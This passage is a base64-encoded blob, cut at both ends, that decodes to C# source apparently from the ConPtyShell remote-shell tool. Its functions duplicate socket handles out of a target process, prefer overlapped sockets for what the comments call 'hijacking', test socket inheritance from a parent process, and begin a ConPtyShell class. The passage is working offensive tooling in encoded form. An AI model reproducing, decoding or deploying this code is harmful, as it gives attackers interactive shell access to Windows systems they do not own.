Z2luYWwgc29ja2V0IGhhcyBiZWVuIGNyZWF0ZWQgd2l0aCB0aGUgb3ZlcmxhcHBlZCBmbGFnLgogICAgICAgICAgICBkdXBsaWNhdGVkU29ja2V0ID0gV1NBU29ja2V0KHdzYVByb3RvY29sSW5mby5pQWRkcmVzc0ZhbWlseSwgd3NhUHJvdG9jb2xJbmZvLmlTb2NrZXRUeXBlLCB3c2FQcm90b2NvbEluZm8uaVByb3RvY29sLCByZWYgd3NhUHJvdG9jb2xJbmZvLCAwLCAwKTsKICAgICAgICAgICAgaWYgKGR1cGxpY2F0ZWRTb2NrZXQuVG9JbnQ2NCgpID4gMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0U29ja2V0ID0gZHVwbGljYXRlZFNvY2tldDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gcmV0U29ja2V0OwogICAgfQoKICAgIC8vaGVscGVyIG1ldGhvZCB3aXRoICJkeW5hbWljIiBidWZmZXIgYWxsb2NhdGlvbgogICAgcHVibGljIHN0YXRpYyBJbnRQdHIgTnRRdWVyeU9iamVjdER5bmFtaWMoSW50UHRyIGhhbmRsZSwgT0JKRUNUX0lORk9STUFUSU9OX0NMQVNTIGluZm9DbGFzcywgaW50IGluZm9MZW5ndGgpCiAgICB7CiAgICAgICAgaWYgKGluZm9MZW5ndGggPT0gMCkKICAgICAgICAgICAgaW5mb0xlbmd0aCA9IE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihpbnQpKTsKICAgICAgICBJbnRQdHIgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGluZm9MZW5ndGgpOwogICAgICAgIHVpbnQgcmVzdWx0OwogICAgICAgIHdoaWxlICh0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgcmVzdWx0ID0gKHVpbnQpTnRRdWVyeU9iamVjdChoYW5kbGUsIGluZm9DbGFzcywgaW5mb1B0ciwgKHVpbnQpaW5mb0xlbmd0aCwgcmVmIGluZm9MZW5ndGgpOwogICAgICAgICAgICBpZiAocmVzdWx0ID09IE5UU1RBVFVTX0lORk9MRU5HVEhNSVNNQVRDSCB8fCByZXN1bHQgPT0gTlRTVEFUVVNfQlVGRkVST1ZFUkZMT1cgfHwgcmVzdWx0ID09IE5UU1RBVFVTX0JVRkZFUlRPT1NNQUxMKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKGluZm9QdHIpOwogICAgICAgICAgICAgICAgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKChpbnQpaW5mb0xlbmd0aCk7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmIChyZXN1bHQgPT0gTlRTVEFUVVNfU1VDQ0VTUykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vdGhyb3cgbmV3IEV4Y2VwdGlvbigiVW5oYW5kbGVkIE50U3RhdHVzICIgKyByZXN1bHQpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHJlc3VsdCA9PSBOVFNUQVRVU19TVUNDRVNTKQogICAgICAgICAgICByZXR1cm4gaW5mb1B0cjsvL2Rvbid0IGZvcmdldCB0byBmcmVlIHRoZSBwb2ludGVyIHdpdGggTWFyc2hhbC5GcmVlSEdsb2JhbCBhZnRlciB5b3UncmUgZG9uZSB3aXRoIGl0CiAgICAgICAgZWxzZQogICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKGluZm9QdHIpOy8vZnJlZSBwb2ludGVyIHdoZW4gbm90IFN1Y2Nlc3NmdWwKICAgICAgICByZXR1cm4gSW50UHRyLlplcm87CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBMaXN0PEludFB0cj4gR2V0U29ja2V0c1RhcmdldFByb2Nlc3MoUHJvY2VzcyB0YXJnZXRQcm9jZXNzKQogICAgewogICAgICAgIE9CSkVDVF9OQU1FX0lORk9STUFUSU9OIG9iak5hbWVJbmZvOwogICAgICAgIGxvbmcgSGFuZGxlc0NvdW50ID0gMDsKICAgICAgICBJbnRQdHIgZHVwSGFuZGxlOwogICAgICAgIEludFB0ciBwdHJPYmplY3ROYW1lOwogICAgICAgIEludFB0ciBwdHJIYW5kbGVzSW5mbzsKICAgICAgICBJbnRQdHIgaFRhcmdldFByb2Nlc3M7CiAgICAgICAgc3RyaW5nIHN0ck9iamVjdE5hbWU7CiAgICAgICAgTGlzdDxJbnRQdHI+IHNvY2tldHNIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOwogICAgICAgIERlYWRsb2NrQ2hlY2tIZWxwZXIgZGVhZGxvY2tDaGVja0hlbHBlck9iaiA9IG5ldyBEZWFkbG9ja0NoZWNrSGVscGVyKCk7CiAgICAgICAgaFRhcmdldFByb2Nlc3MgPSBPcGVuUHJvY2VzcyhQUk9DRVNTX0RVUF9IQU5ETEUsIGZhbHNlLCB0YXJnZXRQcm9jZXNzLklkKTsKICAgICAgICBpZiAoaFRhcmdldFByb2Nlc3MgPT0gSW50UHRyLlplcm8pCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ2Fubm90IG9wZW4gdGFyZ2V0IHByb2Nlc3Mgd2l0aCBwaWQgIiArIHRhcmdldFByb2Nlc3MuSWQuVG9TdHJpbmcoKSArICIgZm9yIER1cGxpY2F0ZUhhbmRsZSBhY2Nlc3MiKTsKICAgICAgICAgICAgcmV0dXJuIHNvY2tldHNIYW5kbGVzOwogICAgICAgIH0KICAgICAgICBwdHJIYW5kbGVzSW5mbyA9IE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbkR5bmFtaWMoU3lzdGVtSGFuZGxlSW5mb3JtYXRpb24sIDApOwogICAgICAgIEhhbmRsZXNDb3VudCA9IE1hcnNoYWwuUmVhZEludFB0cihwdHJIYW5kbGVzSW5mbykuVG9JbnQ2NCgpOwogICAgICAgIC8vIGNyZWF0ZSBhIHBvaW50ZXIgYXQgdGhlIGJlZ2lubmluZyBvZiB0aGUgYWRkcmVzcyBvZiBTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk9bXQogICAgICAgIEludFB0ciBwdHJIYW5kbGVzSW5mb0N1cnJlbnQgPSBuZXcgSW50UHRyKHB0ckhhbmRsZXNJbmZvLlRvSW50NjQoKSArIEludFB0ci5TaXplKTsKICAgICAgICAvLyBnZXQgVHlwZUluZGV4IGZvciAiRmlsZSIgb2JqZWN0cywgbmVlZGVkIHRvIGZpbHRlciBvbmx5IHNvY2tldHMgb2JqZWN0cwogICAgICAgIGJ5dGUgVHlwZUluZGV4RmlsZU9iamVjdCA9IEdldFR5cGVJbmRleEJ5TmFtZSgiRmlsZSIpOwogICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgSGFuZGxlc0NvdW50OyBpKyspCiAgICAgICAgewogICAgICAgICAgICBTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk8gc3lzSGFuZGxlOwogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc3lzSGFuZGxlID0gKFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTylNYXJzaGFsLlB0clRvU3RydWN0dXJlKHB0ckhhbmRsZXNJbmZvQ3VycmVudCwgdHlwZW9mKFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTykpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vbW92ZSBwb2ludGVyIHRvIG5leHQgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPCiAgICAgICAgICAgIHB0ckhhbmRsZXNJbmZvQ3VycmVudCA9IChJbnRQdHIpKHB0ckhhbmRsZXNJbmZvQ3VycmVudC5Ub0ludDY0KCkgKyBNYXJzaGFsLlNpemVPZih0eXBlb2YoU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPKSkpOwogICAgICAgICAgICBpZiAoc3lzSGFuZGxlLlVuaXF1ZVByb2Nlc3NJZCAhPSB0YXJnZXRQcm9jZXNzLklkIHx8IHN5c0hhbmRsZS5PYmplY3RUeXBlSW5kZXggIT0gVHlwZUluZGV4RmlsZU9iamVjdCkKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICBpZiAoRHVwbGljYXRlSGFuZGxlKGhUYXJnZXRQcm9jZXNzLCAoSW50UHRyKXN5c0hhbmRsZS5IYW5kbGVWYWx1ZSwgR2V0Q3VycmVudFByb2Nlc3MoKSwgb3V0IGR1cEhhbmRsZSwgMCwgZmFsc2UsIERVUExJQ0FURV9TQU1FX0FDQ0VTUykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmIChkZWFkbG9ja0NoZWNrSGVscGVyT2JqLkNoZWNrRGVhZGxvY2tEZXRlY3RlZChkdXBIYW5kbGUpKQogICAgICAgICAgICAgICAgeyAvLyB0aGlzIHdpbGwgYXZvaWRzIGRlYWRsb2NrcyBvbiBzcGVjaWFsIG5hbWVkIHBpcGUgaGFuZGxlcwogICAgICAgICAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogRGVhZGxvY2sgZGV0ZWN0ZWQiKTsKICAgICAgICAgICAgICAgICAgICBDbG9zZUhhbmRsZShkdXBIYW5kbGUpOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcHRyT2JqZWN0TmFtZSA9IE50UXVlcnlPYmplY3REeW5hbWljKGR1cEhhbmRsZSwgT0JKRUNUX0lORk9STUFUSU9OX0NMQVNTLk9iamVjdE5hbWVJbmZvcm1hdGlvbiwgMCk7CiAgICAgICAgICAgICAgICBpZiAocHRyT2JqZWN0TmFtZSA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDbG9zZUhhbmRsZShkdXBIYW5kbGUpOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgb2JqTmFtZUluZm8gPSAoT0JKRUNUX05BTUVfSU5GT1JNQVRJT04pTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHJPYmplY3ROYW1lLCB0eXBlb2YoT0JKRUNUX05BTUVfSU5GT1JNQVRJT04pKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ2xvc2VIYW5kbGUoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChvYmpOYW1lSW5mby5OYW1lLkJ1ZmZlciAhPSBJbnRQdHIuWmVybyAmJiBvYmpOYW1lSW5mby5OYW1lLkxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgc3RyT2JqZWN0TmFtZSA9IE1hcnNoYWwuUHRyVG9TdHJpbmdVbmkob2JqTmFtZUluZm8uTmFtZS5CdWZmZXIsIG9iak5hbWVJbmZvLk5hbWUuTGVuZ3RoIC8gMik7CiAgICAgICAgICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBmaWxlIGhhbmRsZSAweCIgKyBkdXBIYW5kbGUuVG9TdHJpbmcoIlg0IikgKyAiIHN0ck9iamVjdE5hbWUgPSAiICsgc3RyT2JqZWN0TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0ck9iamVjdE5hbWUgPT0gIlxcRGV2aWNlXFxBZmQiKQogICAgICAgICAgICAgICAgICAgICAgICBzb2NrZXRzSGFuZGxlcy5BZGQoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIENsb3NlSGFuZGxlKGR1cEhhbmRsZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgQ2xvc2VIYW5kbGUoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwocHRyT2JqZWN0TmFtZSk7CiAgICAgICAgICAgICAgICBwdHJPYmplY3ROYW1lID0gSW50UHRyLlplcm87CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChwdHJIYW5kbGVzSW5mbyk7CiAgICAgICAgTGlzdDxJbnRQdHI+IGR1cGVkU29ja2V0c0hhbmRsZXMgPSBEdXBsaWNhdGVTb2NrZXRzRnJvbUhhbmRsZXMoc29ja2V0c0hhbmRsZXMpOwogICAgICAgIGlmIChkdXBlZFNvY2tldHNIYW5kbGVzLkNvdW50ID49IDEpCiAgICAgICAgICAgIGR1cGVkU29ja2V0c0hhbmRsZXMgPSBGaWx0ZXJBbmRPcmRlclNvY2tldHNCeUJ5dGVzSW4oZHVwZWRTb2NrZXRzSGFuZGxlcyk7CiAgICAgICAgc29ja2V0c0hhbmRsZXMgPSBkdXBlZFNvY2tldHNIYW5kbGVzOwogICAgICAgIHJldHVybiBzb2NrZXRzSGFuZGxlczsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNTb2NrZXRJbmhlcml0ZWQoSW50UHRyIHNvY2tldEhhbmRsZSwgUHJvY2VzcyBwYXJlbnRQcm9jZXNzKQogICAgewogICAgICAgIGJvb2wgaW5oZXJpdGVkID0gZmFsc2U7CiAgICAgICAgTGlzdDxJbnRQdHI+IHBhcmVudFNvY2tldHNIYW5kbGVzID0gR2V0U29ja2V0c1RhcmdldFByb2Nlc3MocGFyZW50UHJvY2Vzcyk7CiAgICAgICAgaWYgKHBhcmVudFNvY2tldHNIYW5kbGVzLkNvdW50IDwgMSkKICAgICAgICAgICAgcmV0dXJuIGluaGVyaXRlZDsKICAgICAgICBmb3JlYWNoIChJbnRQdHIgcGFyZW50U29ja2V0SGFuZGxlIGluIHBhcmVudFNvY2tldHNIYW5kbGVzKQogICAgICAgIHsKICAgICAgICAgICAgU09DS0FERFJfSU4gc29ja2FkZHJUYXJnZXRQcm9jZXNzID0gbmV3IFNPQ0tBRERSX0lOKCk7CiAgICAgICAgICAgIFNPQ0tBRERSX0lOIHNvY2thZGRyUGFyZW50UHJvY2VzcyA9IG5ldyBTT0NLQUREUl9JTigpOwogICAgICAgICAgICBpbnQgc29ja2FkZHJUYXJnZXRQcm9jZXNzTGVuID0gTWFyc2hhbC5TaXplT2Yoc29ja2FkZHJUYXJnZXRQcm9jZXNzKTsKICAgICAgICAgICAgaW50IHNvY2thZGRyUGFyZW50UHJvY2Vzc0xlbiA9IE1hcnNoYWwuU2l6ZU9mKHNvY2thZGRyUGFyZW50UHJvY2Vzcyk7CiAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgIChnZXRwZWVybmFtZShzb2NrZXRIYW5kbGUsIHJlZiBzb2NrYWRkclRhcmdldFByb2Nlc3MsIHJlZiBzb2NrYWRkclRhcmdldFByb2Nlc3NMZW4pID09IDApICYmCiAgICAgICAgICAgICAgICAoZ2V0cGVlcm5hbWUocGFyZW50U29ja2V0SGFuZGxlLCByZWYgc29ja2FkZHJQYXJlbnRQcm9jZXNzLCByZWYgc29ja2FkZHJQYXJlbnRQcm9jZXNzTGVuKSA9PSAwKSAmJgogICAgICAgICAgICAgICAgKHNvY2thZGRyVGFyZ2V0UHJvY2Vzcy5zaW5fYWRkciA9PSBzb2NrYWRkclBhcmVudFByb2Nlc3Muc2luX2FkZHIgJiYgc29ja2FkZHJUYXJnZXRQcm9jZXNzLnNpbl9wb3J0ID09IHNvY2thZGRyUGFyZW50UHJvY2Vzcy5zaW5fcG9ydCkKICAgICAgICAgICAgICAgKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IGZvdW5kIGluaGVyaXRlZCBzb2NrZXQhIGhhbmRsZSAtLT4gMHgiICsgcGFyZW50U29ja2V0SGFuZGxlLlRvU3RyaW5nKCJYNCIpKTsKICAgICAgICAgICAgICAgIGluaGVyaXRlZCA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2xvc2Vzb2NrZXQocGFyZW50U29ja2V0SGFuZGxlKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGluaGVyaXRlZDsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNTb2NrZXRPdmVybGFwcGVkKEludFB0ciBzb2NrZXQpCiAgICB7CiAgICAgICAgYm9vbCByZXQgPSBmYWxzZTsKICAgICAgICBJbnRQdHIgc29ja0V2ZW50ID0gSW50UHRyLlplcm87CiAgICAgICAgaW50IG50U3RhdHVzID0gLTE7CiAgICAgICAgU09DS0VUX0NPTlRFWFQgY29udGV4dERhdGEgPSBuZXcgU09DS0VUX0NPTlRFWFQoKTsKICAgICAgICBudFN0YXR1cyA9IE50Q3JlYXRlRXZlbnQocmVmIHNvY2tFdmVudCwgRVZFTlRfQUxMX0FDQ0VTUywgSW50UHRyLlplcm8sIFN5bmNocm9uaXphdGlvbkV2ZW50LCBmYWxzZSk7CiAgICAgICAgaWYgKG50U3RhdHVzICE9IE5UU1RBVFVTX1NVQ0NFU1MpCiAgICAgICAgewogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IE50Q3JlYXRlRXZlbnQgZmFpbGVkIHdpdGggZXJyb3IgY29kZSAweCIgKyBudFN0YXR1cy5Ub1N0cmluZygiWDgiKSk7IDsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgSU9fU1RBVFVTX0JMT0NLIElPU0IgPSBuZXcgSU9fU1RBVFVTX0JMT0NLKCk7CiAgICAgICAgbnRTdGF0dXMgPSBOdERldmljZUlvQ29udHJvbEZpbGUxKHNvY2tldCwgc29ja0V2ZW50LCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIHJlZiBJT1NCLCBJT0NUTF9BRkRfR0VUX0NPTlRFWFQsIEludFB0ci5aZXJvLCAwLCByZWYgY29udGV4dERhdGEsIE1hcnNoYWwuU2l6ZU9mKGNvbnRleHREYXRhKSk7CiAgICAgICAgLy8gV2FpdCBmb3IgQ29tcGxldGlvbiAKICAgICAgICBpZiAobnRTdGF0dXMgPT0gTlRTVEFUVVNfUEVORElORykKICAgICAgICB7CiAgICAgICAgICAgIFdhaXRGb3JTaW5nbGVPYmplY3Qoc29ja0V2ZW50LCBJTkZJTklURSk7CiAgICAgICAgICAgIG50U3RhdHVzID0gSU9TQi5zdGF0dXM7CiAgICAgICAgfQogICAgICAgIENsb3NlSGFuZGxlKHNvY2tFdmVudCk7CgogICAgICAgIGlmIChudFN0YXR1cyAhPSBOVFNUQVRVU19TVUNDRVNTKQogICAgICAgIHsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBOdERldmljZUlvQ29udHJvbEZpbGUgZmFpbGVkIHdpdGggZXJyb3IgY29kZSAweCIgKyBudFN0YXR1cy5Ub1N0cmluZygiWDgiKSk7IDsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgaWYgKChjb250ZXh0RGF0YS5TaGFyZWREYXRhLkNyZWF0aW9uRmxhZ3MgJiBXU0FfRkxBR19PVkVSTEFQUEVEKSAhPSAwKSByZXQgPSB0cnVlOwogICAgICAgIHJldHVybiByZXQ7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBJbnRQdHIgRHVwbGljYXRlVGFyZ2V0UHJvY2Vzc1NvY2tldChQcm9jZXNzIHRhcmdldFByb2Nlc3MsIHJlZiBib29sIG92ZXJsYXBwZWRTb2NrZXQpCiAgICB7CiAgICAgICAgSW50UHRyIHRhcmdldFNvY2tldEhhbmRsZSA9IEludFB0ci5aZXJvOwogICAgICAgIExpc3Q8SW50UHRyPiB0YXJnZXRQcm9jZXNzU29ja2V0cyA9IEdldFNvY2tldHNUYXJnZXRQcm9jZXNzKHRhcmdldFByb2Nlc3MpOwogICAgICAgIGlmICh0YXJnZXRQcm9jZXNzU29ja2V0cy5Db3VudCA8IDEpIHJldHVybiB0YXJnZXRTb2NrZXRIYW5kbGU7CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgZm9yZWFjaCAoSW50UHRyIHNvY2tldEhhbmRsZSBpbiB0YXJnZXRQcm9jZXNzU29ja2V0cykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gd2UgcHJpb3JpdGl6ZSB0aGUgaGlqYWNraW5nIG9mIE92ZXJsYXBwZWQgc29ja2V0cwogICAgICAgICAgICAgICAgaWYgKCFJc1NvY2tldE92ZXJsYXBwZWQoc29ja2V0SGFuZGxlKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IEZvdW5kIGEgdXNhYmxlIHNvY2tldCwgYnV0IGl0IGhhcyBub3QgYmVlbiBjcmVhdGVkIHdpdGggdGhlIGZsYWcgV1NBX0ZMQUdfT1ZFUkxBUFBFRCwgc2tpcHBpbmcuLi4iKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHRhcmdldFNvY2tldEhhbmRsZSA9IHNvY2tldEhhbmRsZTsKICAgICAgICAgICAgICAgIG92ZXJsYXBwZWRTb2NrZXQgPSB0cnVlOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gbm8gT3ZlcmxhcHBlZCBzb2NrZXRzIGZvdW5kLCBleHBhbmRpbmcgdGhlIHNjb3BlIGJ5IGluY2x1ZGluZyBhbHNvIE5vbi1PdmVybGFwcGVkIHNvY2tldHMKICAgICAgICAgICAgaWYgKHRhcmdldFNvY2tldEhhbmRsZSA9PSBJbnRQdHIuWmVybykgewogICAgICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBObyBvdmVybGFwcGVkIHNvY2tldHMgZm91bmQuIFRyeWluZyB0byByZXR1cm4gYWxzbyBub24tb3ZlcmxhcHBlZCBzb2NrZXRzLi4uIik7CiAgICAgICAgICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29ja2V0SGFuZGxlIGluIHRhcmdldFByb2Nlc3NTb2NrZXRzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRhcmdldFNvY2tldEhhbmRsZSA9IHNvY2tldEhhbmRsZTsKICAgICAgICAgICAgICAgICAgICBpZiAoIUlzU29ja2V0T3ZlcmxhcHBlZCh0YXJnZXRTb2NrZXRIYW5kbGUpKSBvdmVybGFwcGVkU29ja2V0ID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHRhcmdldFNvY2tldEhhbmRsZSA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJObyBzb2NrZXRzIGZvdW5kLCBzbyBubyBoaWphY2thYmxlIHNvY2tldHMgOiggRXhpdGluZy4uLiIpOwogICAgICAgIHJldHVybiB0YXJnZXRTb2NrZXRIYW5kbGU7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgU2V0U29ja2V0QmxvY2tpbmdNb2RlKEludFB0ciBzb2NrZXQsIGludCBtb2RlKQogICAgewogICAgICAgIGludCBGSU9OQklPID0gLTIxNDcxOTUyNjY7CiAgICAgICAgaW50IE5vbkJsb2NraW5nTW9kZSA9IDE7CiAgICAgICAgaW50IEJsb2NraW5nTW9kZSA9IDA7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBpZiAobW9kZSA9PSAxKQogICAgICAgICAgICByZXN1bHQgPSBpb2N0bHNvY2tldChzb2NrZXQsIEZJT05CSU8sIHJlZiBOb25CbG9ja2luZ01vZGUpOwogICAgICAgIGVsc2UKICAgICAgICAgICAgcmVzdWx0ID0gaW9jdGxzb2NrZXQoc29ja2V0LCBGSU9OQklPLCByZWYgQmxvY2tpbmdNb2RlKTsKICAgICAgICBpZiAocmVzdWx0ID09IC0xKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oImlvY3Rsc29ja2V0IGZhaWxlZCB3aXRoIHJldHVybiBjb2RlICIgKyByZXN1bHQuVG9TdHJpbmcoKSArICIgYW5kIHdzYWxhc3RlcnJvcjogIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgfQp9CgovLyBzb3VyY2UgZnJvbSAtLT4gaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9hLzMzNDYwNTUKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IFBhcmVudFByb2Nlc3NVdGlsaXRpZXMKewogICAgLy8gVGhlc2UgbWVtYmVycyBtdXN0IG1hdGNoIFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04KICAgIGludGVybmFsIEludFB0ciBSZXNlcnZlZDE7CiAgICBpbnRlcm5hbCBJbnRQdHIgUGViQmFzZUFkZHJlc3M7CiAgICBpbnRlcm5hbCBJbnRQdHIgUmVzZXJ2ZWQyXzA7CiAgICBpbnRlcm5hbCBJbnRQdHIgUmVzZXJ2ZWQyXzE7CiAgICBpbnRlcm5hbCBJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOwogICAgaW50ZXJuYWwgSW50UHRyIEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoSW50UHRyIHByb2Nlc3NIYW5kbGUsIGludCBwcm9jZXNzSW5mb3JtYXRpb25DbGFzcywgcmVmIFBhcmVudFByb2Nlc3NVdGlsaXRpZXMgcHJvY2Vzc0luZm9ybWF0aW9uLCBpbnQgcHJvY2Vzc0luZm9ybWF0aW9uTGVuZ3RoLCBvdXQgaW50IHJldHVybkxlbmd0aCk7CgogICAgcHVibGljIHN0YXRpYyBQcm9jZXNzIEdldFBhcmVudFByb2Nlc3MoKQogICAgewogICAgICAgIHJldHVybiBHZXRQYXJlbnRQcm9jZXNzKFByb2Nlc3MuR2V0Q3VycmVudFByb2Nlc3MoKS5IYW5kbGUpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgUHJvY2VzcyBHZXRQYXJlbnRQcm9jZXNzKGludCBpZCkKICAgIHsKICAgICAgICBQcm9jZXNzIHByb2Nlc3MgPSBQcm9jZXNzLkdldFByb2Nlc3NCeUlkKGlkKTsKICAgICAgICByZXR1cm4gR2V0UGFyZW50UHJvY2Vzcyhwcm9jZXNzLkhhbmRsZSk7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBQcm9jZXNzIEdldFBhcmVudFByb2Nlc3MoSW50UHRyIGhhbmRsZSkKICAgIHsKICAgICAgICBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzIHBiaSA9IG5ldyBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzKCk7CiAgICAgICAgaW50IHJldHVybkxlbmd0aDsKICAgICAgICBpbnQgc3RhdHVzID0gTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhoYW5kbGUsIDAsIHJlZiBwYmksIE1hcnNoYWwuU2l6ZU9mKHBiaSksIG91dCByZXR1cm5MZW5ndGgpOwogICAgICAgIGlmIChzdGF0dXMgIT0gMCkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKHN0YXR1cy5Ub1N0cmluZygpKTsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBQcm9jZXNzLkdldFByb2Nlc3NCeUlkKHBiaS5Jbmhlcml0ZWRGcm9tVW5pcXVlUHJvY2Vzc0lkLlRvSW50MzIoKSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChBcmd1bWVudEV4Y2VwdGlvbikKICAgICAgICB7CiAgICAgICAgICAgIC8vIG5vdCBmb3VuZAogICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICB9CiAgICB9Cn0KCnB1YmxpYyBzdGF0aWMgY2xhc3MgQ29uUHR5U2hlbGwKewogICAgcHJpdmF0ZSBjb25zdCBzdHJpbmcgZXJyb3JTdHJpbmcgPSAie3t7Q29uUHR5U2hlbGxFeGNlcHRpb259fX1cclxuIjsKICAgIHByaXZhdGUgY29uc3QgdWludCBFTkFCTEVfVklSVFVBTF9URVJNSU5BTF9QUk9DRVNTSU5HID0gMHgwMDA0OwogICAgcHJpdmF0ZSBjb25zdCB1aW50IERJU0FCTEVfTkVXT